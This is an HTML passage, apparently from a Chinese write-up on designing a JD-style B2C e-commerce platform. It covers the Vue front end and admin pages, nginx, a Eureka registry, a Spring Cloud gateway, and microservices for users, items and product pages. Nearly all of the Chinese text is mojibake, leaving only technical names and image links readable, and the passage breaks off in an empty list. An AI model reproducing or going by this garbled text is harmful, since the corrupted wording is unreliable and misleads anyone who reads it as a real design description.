<h1 id="ä¸‰ã€éœ€æ±‚åˆ†æ"><a href="#ä¸‰ã€éœ€æ±‚åˆ†æ" class="headerlink" title="ä¸‰ã€éœ€æ±‚åˆ†æ"></a>ä¸‰ã€éœ€æ±‚åˆ†æ</h1><p>ç±»äº¬ä¸œçš„ç”µå•†å¹³å°æ˜¯ä¸€ä¸ªå…¸å‹çš„B2Cï¼ˆBusiness to Customerï¼‰ç±»å‹çš„ç”µå­å•†åŠ¡å¹³å°ã€‚æ—¢è¦é¢å‘ç”¨æˆ·ï¼Œåˆè¦é¢å‘ç®¡ç†å‘˜ã€‚å°±é¢å‘ç”¨æˆ·è€Œè¨€ï¼Œç³»ç»Ÿåº”å®ç°æ³¨å†Œã€ç™»é™†ã€æµè§ˆå•†å“ã€æœç´¢å•†å“ã€äº§ç”Ÿè®¢å•ï¼ŒæŸ¥çœ‹è®¢å•ï¼ŒæŸ¥çœ‹ä¸ªäººä¿¡æ¯ç­‰åŠŸèƒ½ï¼›å°±é¢å‘ç®¡ç†å‘˜è€Œè¨€ï¼Œç³»ç»Ÿåº”å®ç°å•†å“ç®¡ç†ã€ä¼šå‘˜ç®¡ç†ã€é”€å”®ç®¡ç†å’Œæƒé™ç®¡ç†ç­‰åŠŸèƒ½ã€‚è™½ç„¶åˆšå¼€å§‹çš„å¹¶å‘é‡ä¸å¤§ï¼Œä½†æ˜¯è€ƒè™‘åˆ°ä»¥åçš„ä¸šåŠ¡æ‰©å±•ä»¥åŠç”¨æˆ·æ•°çš„æ¿€å¢ï¼Œæˆ‘ä»¬é€‰æ‹©é‡‡ç”¨å¾®æœåŠ¡æ¶æ„æ‰æ­å»ºè¯¥é¡¹ç›®ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ï¼Œä»¥åŠè®¾è®¡åˆ†å¸ƒå¼é”ï¼Œç¡®ä¿æ•´ä¸ªå¹³å°å®‰å…¨å¯é çš„è¿è¡Œï¼Œä¸ä¼šå‡ºç°åº“å­˜è¶…å–ç­‰æƒ…å†µã€‚</p>
<h1 id="å››ã€é¡¹ç›®ä¸»è¦æ¨¡å—è®¾è®¡"><a href="#å››ã€é¡¹ç›®ä¸»è¦æ¨¡å—è®¾è®¡" class="headerlink" title="å››ã€é¡¹ç›®ä¸»è¦æ¨¡å—è®¾è®¡"></a>å››ã€é¡¹ç›®ä¸»è¦æ¨¡å—è®¾è®¡</h1><h2 id="é¡¹ç›®æ€»ä½“ç»“æ„è®¾è®¡"><a href="#é¡¹ç›®æ€»ä½“ç»“æ„è®¾è®¡" class="headerlink" title="é¡¹ç›®æ€»ä½“ç»“æ„è®¾è®¡"></a>é¡¹ç›®æ€»ä½“ç»“æ„è®¾è®¡</h2><p>æœ¬é¡¹ç›®å¯åˆ†ä¸ºå‰ç«¯åº”ç”¨å’Œåå°æœåŠ¡ä¸‰å¤§æ¨¡å—ã€‚</p>
<ul>
<li><p>å‰ç«¯åº”ç”¨å¯åˆ†ä¸ºåŸºäºH5çš„å‰å°é—¨æˆ·æœåŠ¡å’ŒåŸºäºSPAçš„åå°ç®¡ç†é¡µé¢ï¼Œå‰å°é—¨æˆ·æœåŠ¡ä¸»è¦ç”¨æ¥å’Œç”¨æˆ·äº¤äº’ï¼Œç”¨æˆ·æµè§ˆå•†å“ï¼Œè´­ä¹°å•†å“ç­‰ç­‰ï¼Œåå°ç®¡ç†é¡µé¢ä¸»è¦ç”¨æ¥å’Œç®¡ç†å‘˜äº¤äº’ï¼Œä¸»è¦å¯ä»¥è¿›è¡Œå•†å“ç®¡ç†ã€ä¼šå‘˜ç®¡ç†ã€é”€å”®ç®¡ç†å’Œæƒé™ç®¡ç†ã€‚</p>
</li>
<li><p>åå°æœåŠ¡å¯åˆ†ä¸ºæ¥å…¥å±‚ï¼Œç½‘å…³å±‚ï¼ŒæœåŠ¡å±‚ï¼ŒåŸºç¡€æœåŠ¡å’Œæ•°æ®å±‚</p>
</li>
</ul>
<p>ä¸šåŠ¡æ¶æ„è®¾è®¡å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120462.png" alt="image-20210703154549744"></p>
<p>é¡¹ç›®æŠ€æœ¯æ¶æ„è®¾è®¡å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120464.png" alt="image-20210703153352619"></p>
<p>ç±»å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120465.png" alt="image-20210704195748193"></p>
<h2 id="å‰å°åº”ç”¨è¯¦ç»†è®¾è®¡"><a href="#å‰å°åº”ç”¨è¯¦ç»†è®¾è®¡" class="headerlink" title="å‰å°åº”ç”¨è¯¦ç»†è®¾è®¡"></a>å‰å°åº”ç”¨è¯¦ç»†è®¾è®¡</h2><h3 id="å‰å°é—¨æˆ·æœåŠ¡"><a href="#å‰å°é—¨æˆ·æœåŠ¡" class="headerlink" title="å‰å°é—¨æˆ·æœåŠ¡"></a>å‰å°é—¨æˆ·æœåŠ¡</h3><h4 id="æŠ€æœ¯æ ˆ"><a href="#æŠ€æœ¯æ ˆ" class="headerlink" title="æŠ€æœ¯æ ˆ:"></a>æŠ€æœ¯æ ˆ:</h4><p>Vueæ¡†æ¶ + ElementUI + Vant + axios + VueRouterè·¯ç”± + Vue CLIè„šæ‰‹æ¶</p>
<h4 id="é¡¹ç›®åŠŸèƒ½æ¨¡å—"><a href="#é¡¹ç›®åŠŸèƒ½æ¨¡å—" class="headerlink" title="é¡¹ç›®åŠŸèƒ½æ¨¡å—"></a>é¡¹ç›®åŠŸèƒ½æ¨¡å—</h4><p>ç™»å½•ä¸æ³¨å†ŒåŠŸèƒ½</p>
<p>â‘ é¡µé¢ä½¿ç”¨äº†element-uiçš„Dialogç»„ä»¶å®ç°å¼¹å‡ºå¯¹è¯æ¡†çš„æ•ˆæœï¼Œç™»å½•æŒ‰é’®è®¾ç½®åœ¨App.vueæ ¹ç»„ä»¶ï¼Œé€šè¿‡vuexä¸­çš„showLoginçŠ¶æ€æ§åˆ¶ç™»å½•æ¡†æ˜¯å¦æ˜¾ç¤ºã€‚</p>
<p>â‘¡å½“ç”¨æˆ·ç™»å½•å¤±è´¥(ç”¨æˆ·è¾“å…¥çš„è´¦å·ä¸å­˜åœ¨)ï¼Œæç¤ºç”¨æˆ·å…ˆè¿›è¡Œæ³¨å†Œè´¦å·ï¼Œå¹¶åˆ‡æ¢ç™»å½•ç»„ä»¶ä¸ºæ³¨å†Œç»„ä»¶ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120466.jpg" alt="img"> </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120467.jpg" alt="img"> </p>
<h4 id="é¦–é¡µå±•ç¤º"><a href="#é¦–é¡µå±•ç¤º" class="headerlink" title="é¦–é¡µå±•ç¤º"></a>é¦–é¡µå±•ç¤º</h4><p>â‘ é¦–é¡µä¸»è¦æ˜¯å¯¹å•†å“çš„å±•ç¤ºï¼Œæœ‰è½®æ’­å›¾å±•ç¤ºæ¨èçš„å•†å“ï¼Œåˆ†ç±»åˆ«å¯¹çƒ­é—¨å•†å“è¿›è¡Œå±•ç¤ºã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120468.jpg" alt="img"> </p>
<h4 id="è´¦å·ç®¡ç†â€“å¾…å‘è´§"><a href="#è´¦å·ç®¡ç†â€“å¾…å‘è´§" class="headerlink" title="è´¦å·ç®¡ç†â€“å¾…å‘è´§"></a>è´¦å·ç®¡ç†â€“å¾…å‘è´§</h4><p>â‘ é€šè¿‡æœåŠ¡å™¨å‘æ¥çš„è®¢å•æ•°æ®ï¼Œå¹¶é€šè¿‡åˆ¤æ–­isSendå­—æ®µåˆ¤æ–­è®¢å•æ˜¯å¦å‘è´§ï¼Œå°†æœªå‘è´§è®¢å•å…¨éƒ¨æ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­å¹¶å°†è®¢å•(å›¾ç‰‡ã€æ ‡é¢˜ã€ä»·æ ¼ã€æ—¶é—´)æ¸²æŸ“åˆ°ç»„ä»¶ä¸Šã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120469.jpg" alt="img"> </p>
<h4 id="è´¦å·ç®¡ç†â€“æˆ‘çš„æ”¶è—"><a href="#è´¦å·ç®¡ç†â€“æˆ‘çš„æ”¶è—" class="headerlink" title="è´¦å·ç®¡ç†â€“æˆ‘çš„æ”¶è—"></a>è´¦å·ç®¡ç†â€“æˆ‘çš„æ”¶è—</h4><p>â‘ å°†æœåŠ¡å™¨ä¼ æ¥çš„ç”¨æˆ·æ”¶è—å•†å“æ•°æ®ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œå¹¶é€šè¿‡V-for å¾ªç¯æ¸²æŸ“åœ¨æ”¶è—ç»„ä»¶ä¸­ã€‚</p>
<p>â‘¡æ•ˆæœå›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120470.jpg" alt="img"> </p>
<h4 id="ä¸ªäººä¿¡æ¯â€“åœ°å€ç®¡ç†"><a href="#ä¸ªäººä¿¡æ¯â€“åœ°å€ç®¡ç†" class="headerlink" title="ä¸ªäººä¿¡æ¯â€“åœ°å€ç®¡ç†"></a>ä¸ªäººä¿¡æ¯â€“åœ°å€ç®¡ç†</h4><p>â‘ å°†æœåŠ¡å™¨ä¼ æ¥çš„ç”¨æˆ·å·²æœ‰åœ°å€æ•°æ®å¾ªç¯æ¸²æŸ“å‡ºæ¥ï¼Œå¹¶å¢åŠ ä¸€ä¸ª æ·»åŠ æ–°åœ°å€åŠŸèƒ½ï¼Œå½“ç”¨æˆ·æ·»åŠ æ–°åœ°å€åï¼Œå‰ç«¯å°†æ–°æ·»åŠ çš„æ•°æ®å¯¹è±¡é€šè¿‡axios è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ä¿å­˜èµ·æ¥ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120471.jpg" alt="img"> </p>
<h4 id="çƒ­é—¨æ¨èï¼šå°†ç”¨æˆ·å¯èƒ½å–œæ¬¢çš„äº§å“å±•ç¤ºåœ¨ç”¨æˆ·æ¨èåˆ—è¡¨ä¸­"><a href="#çƒ­é—¨æ¨èï¼šå°†ç”¨æˆ·å¯èƒ½å–œæ¬¢çš„äº§å“å±•ç¤ºåœ¨ç”¨æˆ·æ¨èåˆ—è¡¨ä¸­" class="headerlink" title="çƒ­é—¨æ¨èï¼šå°†ç”¨æˆ·å¯èƒ½å–œæ¬¢çš„äº§å“å±•ç¤ºåœ¨ç”¨æˆ·æ¨èåˆ—è¡¨ä¸­"></a>çƒ­é—¨æ¨èï¼šå°†ç”¨æˆ·å¯èƒ½å–œæ¬¢çš„äº§å“å±•ç¤ºåœ¨ç”¨æˆ·æ¨èåˆ—è¡¨ä¸­</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120472.jpg" alt="img"></p>
<h3 id="ç®¡ç†å‘˜é¡µé¢æœåŠ¡"><a href="#ç®¡ç†å‘˜é¡µé¢æœåŠ¡" class="headerlink" title="ç®¡ç†å‘˜é¡µé¢æœåŠ¡"></a>ç®¡ç†å‘˜é¡µé¢æœåŠ¡</h3><h4 id="ç®¡ç†å‘˜é¡µé¢æœåŠ¡é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æœ‰ï¼š"><a href="#ç®¡ç†å‘˜é¡µé¢æœåŠ¡é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æœ‰ï¼š" class="headerlink" title="ç®¡ç†å‘˜é¡µé¢æœåŠ¡é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æœ‰ï¼š"></a>ç®¡ç†å‘˜é¡µé¢æœåŠ¡é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æœ‰ï¼š</h4><ul>
<li><p>ç™»å½•åŠŸèƒ½é¡µé¢</p>
</li>
<li><p>å•†å“ç®¡ç†ï¼šåŒ…æ‹¬å•†å“åˆ†ç±»ç®¡ç†ï¼Œå“ç‰Œç®¡ç†ï¼Œå•†å“åˆ—è¡¨ã€å•†å“è§„æ ¼ä¿¡æ¯ç®¡ç†</p>
</li>
<li><p>é”€å”®ç®¡ç†ï¼šåŒ…æ‹¬äº¤æ˜“ç»Ÿè®¡ã€è®¢å•ç®¡ç†ã€ç‰©æµç®¡ç†ã€ä¿ƒé”€ç®¡ç†ã€‚</p>
</li>
<li><p>ä¼šå‘˜ç®¡ç†ï¼šåŒ…æ‹¬ä¼šå‘˜ç»Ÿè®¡ã€ä¼šå‘˜ç®¡ç†ã€‚</p>
</li>
<li><p>æƒé™ç®¡ç†ï¼šåŒ…æ‹¬æƒé™ç®¡ç†ã€è§’è‰²ç®¡ç†ã€äººå‘˜ç®¡ç†ã€æœåŠ¡ç®¡ç†ã€‚</p>
</li>
</ul>
<h4 id="ç”µå•†åå°ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºVue-æŠ€æœ¯æ ˆçš„-SPA-å•é¡µé¢åº”ç”¨é¡¹ç›®ï¼Œå…±-15-ä¸ªå…·æœ‰äº¤äº’åŠŸèƒ½çš„é¡µé¢ã€‚"><a href="#ç”µå•†åå°ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºVue-æŠ€æœ¯æ ˆçš„-SPA-å•é¡µé¢åº”ç”¨é¡¹ç›®ï¼Œå…±-15-ä¸ªå…·æœ‰äº¤äº’åŠŸèƒ½çš„é¡µé¢ã€‚" class="headerlink" title="ç”µå•†åå°ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºVue æŠ€æœ¯æ ˆçš„ SPA å•é¡µé¢åº”ç”¨é¡¹ç›®ï¼Œå…± 15 ä¸ªå…·æœ‰äº¤äº’åŠŸèƒ½çš„é¡µé¢ã€‚"></a>ç”µå•†åå°ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºVue æŠ€æœ¯æ ˆçš„ SPA å•é¡µé¢åº”ç”¨é¡¹ç›®ï¼Œå…± 15 ä¸ªå…·æœ‰äº¤äº’åŠŸèƒ½çš„é¡µé¢ã€‚</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120473.jpg" alt="img"></p>
<h4 id="ä¸»è¦æŠ€æœ¯æ ˆ"><a href="#ä¸»è¦æŠ€æœ¯æ ˆ" class="headerlink" title="ä¸»è¦æŠ€æœ¯æ ˆ"></a>ä¸»è¦æŠ€æœ¯æ ˆ</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120474.png" alt="image-20210704200044327"></p>
<h4 id="ç™»é™†åŠŸèƒ½"><a href="#ç™»é™†åŠŸèƒ½" class="headerlink" title="ç™»é™†åŠŸèƒ½"></a>ç™»é™†åŠŸèƒ½</h4><p>ç™»å½•ä¸šåŠ¡æµç¨‹</p>
<ul>
<li><p>åœ¨ç™»å½•é¡µé¢è¾“å…¥ç”¨æˆ·åå’Œå¯†ç  </p>
</li>
<li><p>è°ƒç”¨åå°æ¥å£è¿›è¡ŒéªŒè¯ </p>
</li>
<li><p>é€šè¿‡éªŒè¯ä¹‹åï¼Œæ ¹æ®åå°çš„å“åº”çŠ¶æ€(200)è·³è½¬åˆ°é¡¹ç›®ä¸»é¡µ</p>
</li>
</ul>
<h4 id="å•†å“ç®¡ç†åŠŸèƒ½"><a href="#å•†å“ç®¡ç†åŠŸèƒ½" class="headerlink" title="å•†å“ç®¡ç†åŠŸèƒ½"></a>å•†å“ç®¡ç†åŠŸèƒ½</h4><p>åœ¨ VueRouter è·¯ç”±å™¨æ–‡ä»¶ä¸­è¿›è¡Œ è·¯ç”±ä¸ç»„ä»¶çš„å¯¹åº”é…ç½®ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120475.png" alt="image-20210704200246538"></p>
<p>é€šè¿‡VueRouterè·¯ç”±ç›‘å¬å™¨ç›‘å¬é¡µé¢ä¸­è·¯ç”±çš„æ”¹å˜ï¼Œå½“è·¯ç”±(é€šè¿‡ç‚¹å‡»æ–‡å­—é“¾æ¥)å‘ç”Ÿæ”¹å˜ï¼Œåˆ™åœ°å€æ ä¸­URLå‘ç”Ÿç›¸åº”å˜åŒ–ï¼Œå¹¶åˆ‡æ¢ä¸åŒçš„ç»„ä»¶å±•ç¤ºåœ¨é¡µé¢ä¸­ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120476.jpg" alt="img"> </p>
<h4 id="ä¼šå‘˜ç®¡ç†åŠŸèƒ½"><a href="#ä¼šå‘˜ç®¡ç†åŠŸèƒ½" class="headerlink" title="ä¼šå‘˜ç®¡ç†åŠŸèƒ½"></a>ä¼šå‘˜ç®¡ç†åŠŸèƒ½</h4><p>(1)ç»Ÿè®¡å•†åŸæ‰€æœ‰ä¼šå‘˜çš„æ¥æºåœ°ä»¥åŠæ•°é‡ï¼Œæ–¹ä¾¿å•†åŸè¿›è¡Œä¼šå‘˜çš„æ–°å¢è®¡åˆ’ã€‚</p>
<p>(2)ä½¿ç”¨ elementUI ç»„ä»¶åº“ç¼–å†™é¡µé¢ç»„ä»¶ï¼Œå¹¶å…·æœ‰ç¼–è¾‘ä¼šå‘˜ä¿¡æ¯å’Œåˆ†é¡µåŠŸèƒ½ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120477.jpg" alt="img"> </p>
<h4 id="é”€å”®ç®¡ç†åŠŸèƒ½"><a href="#é”€å”®ç®¡ç†åŠŸèƒ½" class="headerlink" title="é”€å”®ç®¡ç†åŠŸèƒ½"></a>é”€å”®ç®¡ç†åŠŸèƒ½</h4><p>(1)é€šè¿‡æ¥æ”¶åå°ä¼ æ¥çš„æ•°æ®ç»Ÿè®¡å•†åŸæŸæ®µæ—¶é—´çš„è®¢å•æ¥æºã€è®¢å•é‡‘é¢ã€è®¢å•ç‰©æµçŠ¶æ€ã€å•†åŸä¿ƒé”€æ´»åŠ¨çš„å¯åŠ¨ä¸ç»“æŸã€‚</p>
<p>(2)å¼•å…¥äº†ç¬¬ä¸‰æ–¹ä¸“ä¸šç»˜å›¾åº“ Echartsï¼Œå®ƒæ˜¯åŸºäº javascript çš„å®ç°çš„å¼€æºå¯è§†åŒ–åº“ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120478.png" alt="image-20210704200350674"></p>
<h4 id="æƒé™ç®¡ç†åŠŸèƒ½"><a href="#æƒé™ç®¡ç†åŠŸèƒ½" class="headerlink" title="æƒé™ç®¡ç†åŠŸèƒ½"></a>æƒé™ç®¡ç†åŠŸèƒ½</h4><p>(1)é€šè¿‡æƒé™ç®¡ç†æ¨¡å—æ§åˆ¶ä¸åŒçš„ç”¨æˆ·å¯ä»¥è¿›è¡Œå“ªäº›æ“ä½œï¼Œå…·ä½“å¯ä»¥é€šè¿‡è§’è‰²çš„æ–¹å¼è¿›è¡Œæ§åˆ¶ï¼Œå³æ¯ä¸ªç”¨æˆ·åˆ†é… ä¸€ä¸ªç‰¹å®šçš„è§’è‰²ï¼Œè§’è‰²åŒ…æ‹¬ä¸åŒçš„åŠŸèƒ½æƒé™ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120479.jpg" alt="img"> </p>
<p>(2)ä½¿ç”¨ç»„ä»¶åº“è¿›è¡Œå¼€å‘ï¼Œå¹¶æœ‰ç¼–è¾‘ã€åˆ é™¤ã€åˆ†é¡µç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120480.jpg" alt="img"> </p>
<h2 id="åå°æœåŠ¡è¯¦ç»†è®¾è®¡"><a href="#åå°æœåŠ¡è¯¦ç»†è®¾è®¡" class="headerlink" title="åå°æœåŠ¡è¯¦ç»†è®¾è®¡"></a>åå°æœåŠ¡è¯¦ç»†è®¾è®¡</h2><h3 id="æ¥å…¥å±‚"><a href="#æ¥å…¥å±‚" class="headerlink" title="æ¥å…¥å±‚"></a>æ¥å…¥å±‚</h3><p>æ¥å…¥å±‚ä½¿ç”¨nginxåšåå‘ä»£ç†</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120481.png" alt="image-20210703145712990"></p>
<p>ç›®å‰æ˜¯ä¸€ä¸ªå¾®æœåŠ¡ï¼Œå¦‚æœè®¿é—®é‡è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ‰›ä¸ä½å¯ä»¥åšé›†ç¾¤ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120482.png" alt="image-20210703150649717"></p>
<h3 id="æ³¨å†Œä¸­å¿ƒ"><a href="#æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æ³¨å†Œä¸­å¿ƒ"></a>æ³¨å†Œä¸­å¿ƒ</h3><p>æ³¨å†Œä¸­å¿ƒé‡‡ç”¨Eurekaï¼ŒEurekaæ»¡è¶³CAPå®šç†é‡Œçš„CAï¼ŒZookeeperæ»¡è¶³CPï¼Œç›¸æ¯”äºZookeeperï¼ŒEurekaæ›´åœ¨æ„æœåŠ¡çš„å¯ç”¨æ€§ï¼Œå¯¹äºå•†åŸé¡¹ç›®ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆåœ¨æ„æœåŠ¡çš„å¯ç”¨æ€§ï¼Œè€Œå¯¹é›†ç¾¤ä¹‹é—´çš„ä¸€è‡´æ€§è¦æ±‚ä¸æ˜¯å¾ˆè‹›åˆ»ï¼Œå³ä½¿æŸä¸ªæœåŠ¡å·²ç»å®•æœºï¼Œè€ŒEurekaæ²¡æœ‰åŠæ—¶æ›´æ–°ä¹Ÿä¸å½±å“ï¼Œå…¶ä»–æœåŠ¡è®¿é—®ä¸åˆ°åšæœåŠ¡é™çº§ï¼Œç„¶åå†è¯·æ±‚å¦ä¸€å°æœåŠ¡å³å¯ã€‚å› æ­¤ï¼Œæœ¬é¡¹ç›®æ³¨å†Œä¸­å¿ƒé€‰æ‹©Eurekaã€‚</p>
<h3 id="ç½‘å…³å±‚"><a href="#ç½‘å…³å±‚" class="headerlink" title="ç½‘å…³å±‚"></a>ç½‘å…³å±‚</h3><p>ç½‘å…³å±‚ä½¿ç”¨Spring Cloud gatewayï¼Œè¯¥å±‚éœ€è¦é…åˆæ³¨å†Œä¸­å¿ƒè¿›è¡ŒæœåŠ¡æ‹‰å–ï¼Œè¯¥å±‚ä½¿ç”¨ribbonåšè´Ÿè½½å‡è¡¡ï¼Œä½¿ç”¨hystrixåšæœåŠ¡é™çº§ï¼Œä»¥åŠéœ€è¦å®ç°è¯·æ±‚é™æµï¼Œæƒé™æ§åˆ¶ï¼Œè§£å†³CROSè·¨åŸŸé—®é¢˜ã€‚</p>
<p>è¯·æ±‚é™æµçš„è®¾è®¡æ–¹æ¡ˆä¸€æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120483.png" alt="image-20210703125828774"></p>
<p>è¯·æ±‚é™æµçš„è®¾è®¡æ–¹æ¡ˆäºŒæµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120484.png" alt="image-20210703125935895"></p>
<h3 id="æœåŠ¡å±‚"><a href="#æœåŠ¡å±‚" class="headerlink" title="æœåŠ¡å±‚"></a>æœåŠ¡å±‚</h3><h4 id="ç”¨æˆ·å¾®æœåŠ¡ï¼ˆly-user-serviceï¼‰"><a href="#ç”¨æˆ·å¾®æœåŠ¡ï¼ˆly-user-serviceï¼‰" class="headerlink" title="ç”¨æˆ·å¾®æœåŠ¡ï¼ˆly-user-serviceï¼‰"></a>ç”¨æˆ·å¾®æœåŠ¡ï¼ˆly-user-serviceï¼‰</h4><p>åœ°å€ç®¡ç†</p>
<p>ç”¨æˆ·ç®¡ç†</p>
<h4 id="å•†å“å¾®æœåŠ¡-ly-item-service"><a href="#å•†å“å¾®æœåŠ¡-ly-item-service" class="headerlink" title="å•†å“å¾®æœåŠ¡(ly-item-service)"></a>å•†å“å¾®æœåŠ¡(ly-item-service)</h4><p>å“ç‰Œç®¡ç†</p>
<p>åˆ†ç±»ç®¡ç†</p>
<p>å•†å“ç®¡ç†</p>
<p>è§„æ ¼ç®¡ç†</p>
<h4 id="å•†å“è¯¦æƒ…é¡µå¾®æœåŠ¡-ly-page"><a href="#å•†å“è¯¦æƒ…é¡µå¾®æœåŠ¡-ly-page" class="headerlink" title="å•†å“è¯¦æƒ…é¡µå¾®æœåŠ¡(ly-page)"></a>å•†å“è¯¦æƒ…é¡µå¾®æœåŠ¡(ly-page)</h4><p>ç”¨æˆ·æœç´¢åˆ°å•†å“åï¼Œå°±ä¼šç‚¹å‡»å•†å“ï¼ŒæŸ¥çœ‹å•†å“è¯¦æƒ…å†…å®¹ï¼Œå°±ä¼šè®¿é—®åˆ°å•†å“è¯¦æƒ…é¡µã€‚å•†å“è¯¦æƒ…é¡µæ˜¯å±•ç¤ºå•†å“è¯¦ç»†ä¿¡æ¯çš„ä¸€ä¸ªé¡µé¢ï¼Œæ‰¿è½½åœ¨ç½‘ç«™çš„å¤§éƒ¨åˆ†æµé‡å’Œè®¢å•çš„å…¥å£ã€‚</p>
<p>å› æ­¤ï¼Œå•†å“è¯¦æƒ…é¡µå¿…é¡»èƒ½å¤Ÿåº”å¯¹é«˜å¹¶å‘çš„å‹åŠ›ã€‚</p>
<h5 id="è®¾è®¡æ€è·¯ä¸€ï¼šä¼ ç»Ÿæ–¹æ¡ˆ"><a href="#è®¾è®¡æ€è·¯ä¸€ï¼šä¼ ç»Ÿæ–¹æ¡ˆ" class="headerlink" title="è®¾è®¡æ€è·¯ä¸€ï¼šä¼ ç»Ÿæ–¹æ¡ˆ"></a>è®¾è®¡æ€è·¯ä¸€ï¼šä¼ ç»Ÿæ–¹æ¡ˆ</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120485.png" alt="image-20210704021148458"></p>
<p>åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç”¨æˆ·è¯·æ±‚nginxæœåŠ¡ï¼Œè·å–åˆ°é™æ€é¡µé¢</li>
<li>ç„¶åé¡µé¢å‘èµ·Nginxï¼Œå‘TomcatæœåŠ¡è·å–æ•°æ®</li>
<li>TomcatæŸ¥è¯¢æ•°æ®åº“</li>
<li>é¡µé¢æ¸²æŸ“</li>
</ul>
<p>è¿™ç§æ–¹æ¡ˆä¸‹ï¼Œæ•°æ®åº“æˆäº†ç“¶é¢ˆï¼Œé«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œæ•°æ®éš¾ä»¥æ”¯æ’‘ã€‚</p>
<h5 id="è®¾è®¡æ€è·¯äºŒï¼šåŠ å…¥ç¼“å­˜"><a href="#è®¾è®¡æ€è·¯äºŒï¼šåŠ å…¥ç¼“å­˜" class="headerlink" title="è®¾è®¡æ€è·¯äºŒï¼šåŠ å…¥ç¼“å­˜"></a>è®¾è®¡æ€è·¯äºŒï¼šåŠ å…¥ç¼“å­˜</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120486.png" alt="image-20210704021449739"></p>
<p>è¿™ç§æ–¹æ¡ˆä¸‹ï¼Œæ•´ä¸ªæœåŠ¡çš„å¹¶å‘èƒ½åŠ›ï¼Œå°±å—é™äºTomcatï¼Œä¸šåŠ¡ç»å¸¸å—åˆ°ä¾èµ–çš„æœåŠ¡ä¸ç¨³å®šè€Œå¯¼è‡´çš„æ€§èƒ½æŠ–åŠ¨ã€‚</p>
<h5 id="è®¾è®¡æ€è·¯ä¸‰ï¼šé¡µé¢é™æ€åŒ–"><a href="#è®¾è®¡æ€è·¯ä¸‰ï¼šé¡µé¢é™æ€åŒ–" class="headerlink" title="è®¾è®¡æ€è·¯ä¸‰ï¼šé¡µé¢é™æ€åŒ–"></a>è®¾è®¡æ€è·¯ä¸‰ï¼šé¡µé¢é™æ€åŒ–</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120487.png" alt="image-20210704021647900"></p>
<p>åŸºæœ¬æµç¨‹ï¼š</p>
<ul>
<li>å•†å“ä¿®æ”¹å‘é€æ¶ˆæ¯åˆ°MQ</li>
<li>å¾®æœåŠ¡ç›‘å¬MQï¼Œå¾—çŸ¥å•†å“å˜åŒ–ï¼Œæ¸²æŸ“å¹¶ç”Ÿæˆä¸€ä¸ªé™æ€é¡µé¢</li>
<li>ç”¨æˆ·è¯·æ±‚Nginx</li>
<li>Nginxç›´æ¥è¿”å›æ¸²æŸ“å¥½çš„é™æ€Html</li>
</ul>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
